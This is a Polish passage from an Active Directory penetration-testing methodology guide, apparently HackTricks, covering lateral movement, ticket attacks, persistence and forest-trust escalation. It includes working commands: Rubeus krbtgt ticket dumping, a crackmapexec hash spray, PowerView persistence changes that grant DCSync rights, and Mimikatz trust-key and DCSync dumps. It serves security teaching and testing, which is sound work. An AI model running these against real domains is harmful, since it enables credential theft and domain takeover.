Jest bardzo **mało prawdopodobne**, że znajdziesz **bilety** bieżącego użytkownika, które **dawałyby Ci uprawnienia do dostępu** do nieoczekiwanych zasobów, ale możesz to sprawdzić:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Mając dane uwierzytelniające domeny lub sesję użytkownika, ponownie przeanalizuj [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack): uwierzytelnione techniki enumeracji i wymuszania uwierzytelnienia mogą ujawnić ścieżki relay, które były niedostępne podczas nieuwierzytelnionego rozpoznania.

### Poszukiwanie danych uwierzytelniających w udziałach komputerów | Udziały SMB

Teraz, gdy masz już podstawowe dane uwierzytelniające, powinieneś sprawdzić, czy możesz **znaleźć** jakieś **interesujące pliki udostępniane wewnątrz AD**. Możesz zrobić to ręcznie, ale jest to bardzo nudne i powtarzalne zadanie (zwłaszcza jeśli znajdziesz setki dokumentów do sprawdzenia).

[**Skorzystaj z tego linku, aby dowiedzieć się więcej o narzędziach, których możesz użyć.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Jeśli możesz **uzyskać dostęp do innych komputerów lub udziałów**, możesz **umieścić pliki** (takie jak plik SCF), których otwarcie spowoduje **wymuszenie uwierzytelnienia NTLM wobec Ciebie**, dzięki czemu będziesz mógł **ukraść** **wyzwanie NTLM** i je złamać:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ta luka umożliwiała każdemu uwierzytelnionemu użytkownikowi **przejęcie kontrolera domeny**.


{{#ref}}
printnightmare.md
{{#endref}}

## Eskalacja uprawnień w Active Directory Z uprzywilejowanymi danymi uwierzytelniającymi/sesją

**W przypadku poniższych technik zwykły użytkownik domeny nie wystarczy — do przeprowadzenia tych ataków potrzebne są specjalne uprawnienia/dane uwierzytelniające.**

### Ekstrakcja hashy

Miejmy nadzieję, że udało Ci się **przejąć** jakieś konto **lokalnego administratora** za pomocą [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), w tym poprzez relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md) oraz [lokalną eskalację uprawnień](../windows-local-privilege-escalation/index.html).\
Następnie nadszedł czas, aby zrzucić wszystkie hashe znajdujące się w pamięci i lokalnie.\
[**Przeczytaj tę stronę o różnych sposobach pozyskiwania hashy.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Gdy masz już hash użytkownika**, możesz użyć go do jego **podszycia się**.\
Musisz użyć **narzędzia**, które **przeprowadzi** **uwierzytelnianie NTLM przy użyciu** tego **hasha**, **lub** możesz utworzyć nową **sessionlogon** i **wstrzyknąć** ten **hash** do **LSASS**, aby podczas wykonywania dowolnego **uwierzytelniania NTLM** został użyty ten **hash**. To ostatnie rozwiązanie wykorzystuje mimikatz.\
[**Przeczytaj tę stronę, aby uzyskać więcej informacji.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Ten atak ma na celu **wykorzystanie hasha NTLM użytkownika do żądania biletów Kerberos**, jako alternatywy dla powszechnego Pass The Hash za pośrednictwem protokołu NTLM. Może to być szczególnie **przydatne w sieciach, w których protokół NTLM jest wyłączony** i jako protokół uwierzytelniania dozwolony jest wyłącznie **Kerberos**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

W metodzie ataku **Pass The Ticket (PTT)** atakujący **kradną bilet uwierzytelniający użytkownika**, zamiast jego hasła lub wartości hash. Następnie skradziony bilet służy do **podszycia się pod użytkownika**, uzyskując nieautoryzowany dostęp do zasobów i usług w sieci.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Ponowne użycie danych uwierzytelniających

Jeśli masz **hash** lub **hasło** **lokalnego administratora**, powinieneś spróbować **zalogować się lokalnie** na innych **komputerach** przy jego użyciu.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Należy pamiętać, że jest to dość **głośne** i **LAPS** może temu **zapobiec**.

### MSSQL Abuse & Trusted Links

Jeśli użytkownik ma uprawnienia do **uzyskiwania dostępu do instancji MSSQL**, może być w stanie użyć ich do **wykonywania poleceń** na hoście MSSQL (jeśli działa jako SA), **wykraść** **hash** NetNTLM lub nawet przeprowadzić **atak** typu **relay**.\
Jeśli instancja MSSQL jest zaufana przez inną instancję za pośrednictwem linku do bazy danych, użytkownik z uprawnieniami do połączonej bazy może być w stanie **wykorzystać relację zaufania do wykonywania zapytań w drugiej instancji**. Takie relacje zaufania można łączyć, co ostatecznie może doprowadzić do źle skonfigurowanej bazy danych, w której użytkownik może wykonywać polecenia.\
**Linki między bazami danych działają nawet w przypadku relacji zaufania między lasami.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Nadużywanie platform IT do zarządzania zasobami/wdrażania

Zewnętrzne pakiety do inwentaryzacji i wdrażania często udostępniają skuteczne ścieżki prowadzące do poświadczeń i wykonywania kodu. Zobacz:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Jeśli znajdziesz dowolny obiekt Computer z atrybutem [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) i masz uprawnienia domenowe na tym komputerze, będziesz w stanie zrzucić z pamięci TGT-y wszystkich użytkowników, którzy logują się na tym komputerze.\
Jeśli więc **Domain Admin zaloguje się na tym komputerze**, będziesz w stanie zrzucić jego TGT i podszyć się pod niego za pomocą [Pass the Ticket](pass-the-ticket.md).\
Dzięki constrained delegation możesz nawet **automatycznie przejąć Print Server** (miejmy nadzieję, że będzie to DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Jeśli użytkownik lub komputer ma zezwolenie na „Constrained Delegation”, będzie mógł **podszyć się pod dowolnego użytkownika, aby uzyskać dostęp do niektórych usług na komputerze**.\
Następnie, jeśli **przejmiesz hash** tego użytkownika/komputera, będziesz w stanie **podszyć się pod dowolnego użytkownika** (nawet administratorów domeny), aby uzyskać dostęp do niektórych usług.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Posiadanie uprawnienia **WRITE** do obiektu Active Directory zdalnego komputera umożliwia uzyskanie wykonywania kodu z **podwyższonymi uprawnieniami**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Nadużywanie uprawnień/ACL

Przejęty użytkownik może mieć **interesujące uprawnienia do niektórych obiektów domeny**, które pozwolą ci później **poruszać się** lateralnie/**eskalować** uprawnienia.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Nadużywanie usługi Printer Spooler

Wykrycie **nasłuchującej usługi Spool** w domenie może zostać **wykorzystane** do **pozyskania nowych poświadczeń** i **eskalacji uprawnień**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Nadużywanie sesji innych użytkowników

Jeśli **inni użytkownicy** **uzyskują dostęp** do **przejętej** maszyny, możliwe jest **pozyskanie poświadczeń z pamięci**, a nawet **wstrzyknięcie beaconów do ich procesów**, aby się pod nich podszyć.\
Zazwyczaj użytkownicy uzyskują dostęp do systemu przez RDP, więc tutaj znajdziesz informacje o przeprowadzaniu kilku ataków na sesje RDP innych użytkowników:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** zapewnia system zarządzania **lokalnym hasłem Administratora** na komputerach przyłączonych do domeny, gwarantując, że jest ono **losowe**, unikalne i często **zmieniane**. Hasła te są przechowywane w Active Directory, a dostęp do nich jest kontrolowany za pomocą ACL wyłącznie dla autoryzowanych użytkowników. Przy wystarczających uprawnieniach do uzyskania dostępu do tych haseł możliwe staje się pivotowanie do innych komputerów.


{{#ref}}
laps.md
{{#endref}}

### Kradzież certyfikatów

**Pozyskanie certyfikatów** z przejętej maszyny może być sposobem na eskalację uprawnień w środowisku:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Nadużywanie szablonów certyfikatów

Jeśli skonfigurowane są **podatne szablony**, można je wykorzystać do eskalacji uprawnień:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation z kontem o wysokich uprawnieniach

### Zrzucanie poświadczeń domeny

Po uzyskaniu uprawnień **Domain Admin** lub, jeszcze lepiej, **Enterprise Admin**, możesz **zrzucić** **bazę danych domeny**: _ntds.dit_.

[**Więcej informacji o ataku DCSync można znaleźć tutaj**](dcsync.md).

[**Więcej informacji o kradzieży pliku NTDS.dit można znaleźć tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc jako Persistence

Niektóre z omówionych wcześniej technik można wykorzystać do persistence.\
Na przykład możesz:

- Uczynić użytkowników podatnymi na [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Uczynić użytkowników podatnymi na [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Nadać użytkownikowi uprawnienia [**DCSync**](#dcsync)

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Atak Silver Ticket** tworzy **prawidłowy bilet Ticket Granting Service (TGS)** dla określonej usługi, wykorzystując **hash NTLM** (na przykład **hash konta komputera**). Metoda ta służy do **uzyskiwania dostępu do uprawnień usługi**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Atak Golden Ticket** polega na uzyskaniu przez atakującego dostępu do **hasha NTLM konta krbtgt** w środowisku Active Directory (AD). Konto to jest wyjątkowe, ponieważ służy do podpisywania wszystkich **Ticket Granting Tickets (TGT)**, które są niezbędne do uwierzytelniania w sieci AD.

Po uzyskaniu tego hasha atakujący może tworzyć **TGT-y** dla dowolnie wybranych kont (atak Silver Ticket).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Są podobne do golden tickets, lecz sfałszowane w sposób, który **omija typowe mechanizmy wykrywania golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Persistence certyfikatów konta**

**Posiadanie certyfikatów konta lub możliwość ich żądania** to bardzo dobry sposób na utrzymanie persistence na koncie użytkownika (nawet jeśli zmieni on hasło):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Persistence certyfikatów domeny**

**Wykorzystanie certyfikatów umożliwia również utrzymanie persistence z wysokimi uprawnieniami w domenie:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### Grupa AdminSDHolder

Obiekt **AdminSDHolder** w Active Directory zapewnia bezpieczeństwo **uprzywilejowanych grup** (takich jak Domain Admins i Enterprise Admins), stosując standardową **Access Control List (ACL)** do tych grup w celu zapobiegania nieautoryzowanym zmianom. Funkcja ta może jednak zostać wykorzystana; jeśli atakujący zmodyfikuje ACL obiektu AdminSDHolder, aby nadać pełny dostęp zwykłemu użytkownikowi, użytkownik ten uzyska szeroką kontrolę nad wszystkimi uprzywilejowanymi grupami. Środek bezpieczeństwa mający zapewniać ochronę może więc przynieść odwrotny skutek, umożliwiając nieuprawniony dostęp, jeśli nie jest dokładnie monitorowany.

[**Więcej informacji o grupie AdminDSHolder tutaj.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### Poświadczenia DSRM

W każdym **Domain Controllerze (DC)** istnieje konto **lokalnego administratora**. Po uzyskaniu praw administratora na takim komputerze hash lokalnego Administratora można wyodrębnić za pomocą **mimikatz**. Następnie konieczna jest modyfikacja rejestru, aby **włączyć możliwość używania tego hasła**, co pozwoli na zdalny dostęp do lokalnego konta Administratora.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### Persistence ACL

Możesz **nadać** użytkownikowi określone **specjalne uprawnienia** do konkretnych obiektów domeny, które pozwolą mu **eskalować uprawnienia w przyszłości**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Deskryptory zabezpieczeń

**Deskryptory zabezpieczeń** służą do **przechowywania** **uprawnień**, jakie **obiekt** ma **do** innego **obiektu**. Jeśli możesz dokonać nawet **niewielkiej zmiany** w **deskryptorze zabezpieczeń** obiektu, możesz uzyskać bardzo interesujące uprawnienia do tego obiektu bez konieczności przynależności do uprzywilejowanej grupy.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Wykorzystaj pomocniczą klasę `dynamicObject` do tworzenia krótkotrwałych principalów/GPO/rekordów DNS z `entryTTL`/`msDS-Entry-Time-To-Die`; usuwają się automatycznie bez tombstones, zacierając ślady w LDAP, a jednocześnie pozostawiając osierocone identyfikatory SID, uszkodzone odwołania `gPLink` lub buforowane odpowiedzi DNS (np. zanieczyszczenie ACE obiektu AdminSDHolder albo złośliwe przekierowania `gPCFileSysPath`/zintegrowanego z AD DNS).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Zmodyfikuj **LSASS** w pamięci, aby ustanowić **uniwersalne hasło**, zapewniające dostęp do wszystkich kont domeny.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Dowiedz się tutaj, czym jest SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Możesz utworzyć **własny SSP**, aby **przechwytywać** w **jawnym tekście** **poświadczenia** używane do uzyskania dostępu do maszyny.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Rejestruje **nowy Domain Controller** w AD i używa go do **wypchnięcia atrybutów** (SIDHistory, SPN-y...) do określonych obiektów, **nie pozostawiając żadnych logów** dotyczących **modyfikacji**. Potrzebujesz uprawnień DA i musisz znajdować się w **domenie głównej**.\
Pamiętaj, że jeśli użyjesz nieprawidłowych danych, pojawią się bardzo nieprzyjemne logi.


{{#ref}}
dcshadow.md
{{#endref}}

### Persistence LAPS

Wcześniej omówiliśmy, jak eskalować uprawnienia, jeśli masz **wystarczające uprawnienia do odczytu haseł LAPS**. Hasła te można jednak również wykorzystać do **utrzymania persistence**.\
Zobacz:


{{#ref}}
laps.md
{{#endref}}

## Eskalacja uprawnień w lesie - relacje zaufania domen

Microsoft uznaje **las** za granicę bezpieczeństwa. Oznacza to, że **przejęcie pojedynczej domeny może potencjalnie doprowadzić do przejęcia całego lasu**.<sup>[[1]](#references)</sup>

### Podstawowe informacje

[**Relacja zaufania domeny**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) to mechanizm bezpieczeństwa umożliwiający użytkownikowi z jednej **domeny** uzyskanie dostępu do zasobów w innej **domenie**. Zasadniczo tworzy ona połączenie między systemami uwierzytelniania obu domen, umożliwiając płynny przepływ weryfikacji uwierzytelniania. Gdy domeny ustanawiają relację zaufania, wymieniają i przechowują określone **klucze** w swoich **Domain Controllerach (DC)**, które mają kluczowe znaczenie dla integralności relacji zaufania.

W typowym scenariuszu, jeśli użytkownik chce uzyskać dostęp do usługi w **zaufanej domenie**, musi najpierw zażądać specjalnego biletu znanego jako **międzyrealmowy TGT** od kontrolera DC własnej domeny. TGT jest szyfrowany współdzielonym **kluczem**, na który zgodziły się obie domeny. Następnie użytkownik przedstawia ten TGT **kontrolerowi DC zaufanej domeny**, aby otrzymać bilet usługi (**TGS**). Po pomyślnej walidacji międzyrealmowego TGT przez kontroler DC zaufanej domeny wystawia on TGS, przyznając użytkownikowi dostęp do usługi.

**Kroki**:

1. **Komputer kliencki** w **Domenie 1** rozpoczyna proces, używając swojego **hasha NTLM** do zażądania **Ticket Granting Ticket (TGT)** od swojego **Domain Controllera (DC1)**.
2. DC1 wystawia nowy TGT, jeśli klient zostanie pomyślnie uwierzytelniony.
3. Następnie klient żąda **międzyrealmowego TGT** od DC1, który jest potrzebny do uzyskania dostępu do zasobów w **Domenie 2**.
4. Międzyrealmowy TGT jest szyfrowany za pomocą **klucza zaufania** współdzielonego przez DC1 i DC2 w ramach dwukierunkowej relacji zaufania domen.
5. Klient przekazuje międzyrealmowy TGT do **Domain Controllera Domeny 2 (DC2)**.
6. DC2 weryfikuje międzyrealmowy TGT za pomocą współdzielonego klucza zaufania i, jeśli jest on prawidłowy, wystawia **Ticket Granting Service (TGS)** dla serwera w Domenie 2, do którego klient chce uzyskać dostęp.
7. Na koniec klient przedstawia ten TGS serwerowi. TGS jest szyfrowany hashem konta serwera i umożliwia uzyskanie dostępu do usługi w Domenie 2.

### Różne relacje zaufania

Należy zauważyć, że **relacja zaufania może być jednokierunkowa lub dwukierunkowa**. W przypadku opcji dwukierunkowej obie domeny ufają sobie nawzajem, natomiast w relacji **jednokierunkowej** jedna z domen jest domeną **zaufaną**, a druga domeną **ufającą**. W tym drugim przypadku **będziesz mieć możliwość uzyskiwania dostępu do zasobów domeny ufającej wyłącznie z domeny zaufanej**.

Jeśli Domena A ufa Domenie B, A jest domeną ufającą, a B domeną zaufaną. Ponadto w **Domenie A** jest to **zaufanie wychodzące**, a w **Domenie B** jest to **zaufanie przychodzące**.

**Różne relacje zaufania**

- **Relacje Parent-Child**: Jest to typowa konfiguracja w ramach tego samego lasu, w której domena podrzędna automatycznie ma dwukierunkową, przechodnią relację zaufania z domeną nadrzędną. Oznacza to, że żądania uwierzytelniania mogą płynnie przepływać między domeną nadrzędną a podrzędną.
- **Relacje Cross-link**: Określane jako „relacje skrótowe”, są ustanawiane między domenami podrzędnymi w celu przyspieszenia procesów przekierowywania. W złożonych lasach przekierowania uwierzytelniania zazwyczaj muszą przejść do katalogu głównego lasu, a następnie wrócić do docelowej domeny. Utworzenie cross-links skraca tę drogę, co jest szczególnie korzystne w środowiskach rozproszonych geograficznie.
- **Relacje External**: Są ustanawiane między różnymi, niepowiązanymi domenami i z natury są nieprzechodnie. Zgodnie z [dokumentacją Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) relacje zewnętrzne są przydatne do uzyskiwania dostępu do zasobów w domenie znajdującej się poza bieżącym lasem, która nie jest połączona relacją zaufania lasów. Bezpieczeństwo jest wzmacniane przez filtrowanie SID w relacjach zewnętrznych.
- **Relacje Tree-root**: Są automatycznie ustanawiane między domeną główną lasu a nowo dodanym korzeniem drzewa. Choć nie są często spotykane, relacje tree-root są ważne podczas dodawania nowych drzew domen do lasu, ponieważ umożliwiają im zachowanie unikalnej nazwy domeny i zapewniają dwukierunkową przechodniość. Więcej informacji można znaleźć w [przewodniku Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Relacje Forest**: Ten typ relacji zaufania jest dwukierunkową, przechodnią relacją między domenami głównymi dwóch lasów i również wymusza filtrowanie SID w celu zwiększenia bezpieczeństwa.
- **Relacje MIT**: Są ustanawiane z nie-Windowsowymi domenami Kerberos zgodnymi z [RFC4120](https://tools.ietf.org/html/rfc4120). Relacje MIT są bardziej wyspecjalizowane i przeznaczone dla środowisk wymagających integracji z systemami opartymi na Kerberos poza ekosystemem Windows.

#### Inne różnice w **relacjach zaufania**

- Relacja zaufania może być również **przechodnia** (A ufa B, B ufa C, więc A ufa C) lub **nieprzechodnia**.
- Relacja zaufania może być skonfigurowana jako **dwukierunkowa** (obie strony ufają sobie nawzajem) lub **jednokierunkowa** (tylko jedna strona ufa drugiej).

### Ścieżka ataku

1. **Wylicz** relacje zaufania
2. Sprawdź, czy jakikolwiek **principal bezpieczeństwa** (użytkownik/grupa/komputer) ma **dostęp** do zasobów **innej domeny**, na przykład dzięki wpisom ACE lub członkostwu w grupach innej domeny. Szukaj **relacji między domenami** (prawdopodobnie właśnie w tym celu utworzono relację zaufania).
1. W tym przypadku kerberoast może być kolejną opcją.
3. **Przejmij** **konta**, które mogą umożliwić **pivotowanie** między domenami.

Atakujący mogą uzyskać dostęp do zasobów w innej domenie za pomocą trzech głównych mechanizmów:

- **Członkostwo w grupach lokalnych**: Principale mogą zostać dodane do lokalnych grup na komputerach, takich jak grupa „Administrators” na serwerze, zapewniając im znaczną kontrolę nad tym komputerem.
- **Członkostwo w grupach obcej domeny**: Principale mogą również być członkami grup w obcej domenie. Skuteczność tej metody zależy jednak od rodzaju relacji zaufania i zakresu grupy.
- **Access Control Lists (ACL)**: Principale mogą być wskazane w **ACL**, szczególnie jako podmioty w **ACE** należących do **DACL**, zapewniając im dostęp do określonych zasobów. Osobom chcącym dokładniej poznać mechanizmy ACL, DACL i ACE szczególnie przydatny będzie whitepaper zatytułowany „[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)”.<sup>[[17]](#references)</sup>

### Znajdowanie zewnętrznych użytkowników/grup z uprawnieniami

Możesz sprawdzić **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**, aby znaleźć foreign security principals w domenie. Będą to użytkownicy/grupy z **zewnętrznej domeny/lasu**.

Możesz sprawdzić to w **Bloodhound** lub za pomocą powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Eskalacja uprawnień z podrzędnego lasu do nadrzędnego
```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Inne sposoby enumerowania relacji zaufania domen:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Istnieją **2 zaufane klucze**: jeden dla _Child --> Parent_, a drugi dla _Parent_ --> _Child_.\
> Możesz sprawdzić ten używany przez bieżącą domenę za pomocą:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Uzyskaj uprawnienia Enterprise admin w domenie child/parent, wykorzystując trust za pomocą SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Zrozumienie, w jaki sposób można wykorzystać Configuration Naming Context (NC), ma kluczowe znaczenie. Configuration NC służy jako centralne repozytorium danych konfiguracyjnych w całym lesie w środowiskach Active Directory (AD). Dane te są replikowane do każdego Domain Controller (DC) w lesie, przy czym zapisywalne DC utrzymują zapisywalną kopię Configuration NC. Aby to wykorzystać, należy mieć **uprawnienia SYSTEM na DC**, najlepiej child DC.

**Link GPO to root DC site**

Kontener Sites w Configuration NC zawiera informacje o lokacjach wszystkich komputerów przyłączonych do domeny w lesie AD. Działając z uprawnieniami SYSTEM na dowolnym DC, attackerzy mogą linkować GPO do lokacji root DC. Działanie to może potencjalnie narazić root domain na kompromitację poprzez manipulowanie zasadami stosowanymi do tych lokacji.

Szczegółowe informacje można znaleźć w badaniach dotyczących [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Compromise any gMSA in the forest**

Jeden z wektorów ataku polega na zaatakowaniu uprzywilejowanych gMSA w domenie. KDS Root key, niezbędny do obliczania haseł gMSA, jest przechowywany w Configuration NC. Dzięki uprawnieniom SYSTEM na dowolnym DC można uzyskać dostęp do KDS Root key i obliczyć hasła dowolnego gMSA w całym lesie.

Szczegółową analizę i instrukcje krok po kroku można znaleźć w:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Uzupełniający atak delegowanego MSA (BadSuccessor – wykorzystanie atrybutów migracji):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Dodatkowe zewnętrzne badania: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema change attack**

Ta metoda wymaga cierpliwości i oczekiwania na utworzenie nowych uprzywilejowanych obiektów AD. Mając uprawnienia SYSTEM, attacker może zmodyfikować AD Schema, aby przyznać dowolnemu użytkownikowi pełną kontrolę nad wszystkimi klasami. Może to prowadzić do nieautoryzowanego dostępu do nowo utworzonych obiektów AD i przejęcia nad nimi kontroli.

Dalsze informacje można znaleźć w [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**From DA to EA with ADCS ESC5**

Podatność ADCS ESC5 dotyczy kontroli nad obiektami Public Key Infrastructure (PKI), umożliwiając utworzenie certificate template, który pozwala na uwierzytelnianie jako dowolny użytkownik w lesie. Ponieważ obiekty PKI znajdują się w Configuration NC, kompromitacja zapisywalnego child DC umożliwia przeprowadzenie ataków ESC5.

Więcej szczegółów można znaleźć w [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> W scenariuszach, w których brakuje ADCS, attacker może skonfigurować niezbędne komponenty, jak opisano w [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Zewnętrzna domena lasu - jednokierunkowa (Inbound) lub dwukierunkowa
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
W tym scenariuszu **Twoja domena jest zaufana** przez domenę zewnętrzną, co daje Ci **nieokreślone uprawnienia** w jej obrębie. Musisz znaleźć, **które podmioty zabezpieczeń z Twojej domeny mają określony dostęp do domeny zewnętrznej**, a następnie spróbować to wykorzystać:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Zewnętrzna domena lasu — jednokierunkowa (wychodząca)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
W tym scenariuszu **twoja domena** **ufa** pewnym **uprawnieniom** podmiotu z **innej domeny**.

Jednak gdy **domena jest zaufana** przez domenę ufającą, zaufana domena **tworzy użytkownika** o **przewidywalnej nazwie**, który używa **hasła zaufanej domeny** jako **hasła**. Oznacza to, że możliwe jest **uzyskanie dostępu do użytkownika z domeny ufającej, aby dostać się do zaufanej domeny**, przeprowadzić jej enumerację i spróbować uzyskać kolejne uprawnienia:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Innym sposobem na skompromitowanie zaufanej domeny jest znalezienie [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) utworzonego w **przeciwnym kierunku** niż trust domeny (co nie jest zbyt częste).

Innym sposobem na skompromitowanie zaufanej domeny jest oczekiwanie na maszynie, do której **użytkownik z zaufanej domeny może uzyskać dostęp**, aby zalogował się przez **RDP**. Następnie attacker może wstrzyknąć kod do procesu sesji RDP i **uzyskać dostęp do domeny źródłowej ofiary** z tego miejsca.\
Co więcej, jeśli **ofiara zamontowała swój dysk twardy**, attacker może z poziomu procesu **sesji RDP** zapisać **backdoory** w **folderze startowym dysku twardego**. Ta technika nosi nazwę **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Ograniczanie ryzyka związanego z nadużywaniem trustów domen

### **SID Filtering:**

- Ryzyko ataków wykorzystujących atrybut SID history w ramach trustów między lasami jest ograniczane przez SID Filtering, który jest domyślnie aktywowany dla wszystkich trustów między lasami. Opiera się to na założeniu, że trusty wewnątrz lasu są bezpieczne, ponieważ zgodnie ze stanowiskiem Microsoftu granicą bezpieczeństwa jest las, a nie domena.
- Istnieje jednak pewien problem: SID filtering może zakłócać działanie aplikacji i dostęp użytkowników, co prowadzi do jego okresowego wyłączania.

### **Selective Authentication:**

- W przypadku trustów między lasami zastosowanie Selective Authentication gwarantuje, że użytkownicy z obu lasów nie są automatycznie uwierzytelniani. Zamiast tego wymagane są jawne uprawnienia, aby użytkownicy mogli uzyskiwać dostęp do domen i serwerów w domenie lub lesie ufającym.
- Należy pamiętać, że środki te nie chronią przed wykorzystaniem zapisywalnego Configuration Naming Context (NC) ani przed atakami na konto trustu.

[**Więcej informacji o trustach domen w ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Abuse AD oparty na LDAP z implantów działających na hoście

